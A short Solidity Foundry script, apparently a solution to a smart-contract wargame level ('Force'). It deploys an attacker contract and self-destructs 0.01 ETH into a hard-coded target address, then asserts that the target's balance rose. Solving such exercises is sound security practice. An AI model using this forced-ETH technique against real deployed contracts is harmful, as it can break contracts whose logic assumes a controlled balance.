// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/7-Force.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    function run() external{
        vm.startBroadcast();

        // Create ForceAttacker contract
        ForceAttacker forceAttacker = new ForceAttacker(payable(0xE28bEdb9A414A7C124aFad480CD267Aa26768fC3));

        // Call `attack()` on `forceAttacker` to selfdestruct ETH into the Force instance
        forceAttacker.attack{ value: 0.01 ether }();

        // Confirm we forced ETH into the contract
        assert(address(0xE28bEdb9A414A7C124aFad480CD267Aa26768fC3).balance > 0);

        vm.stopBroadcast();
    }
}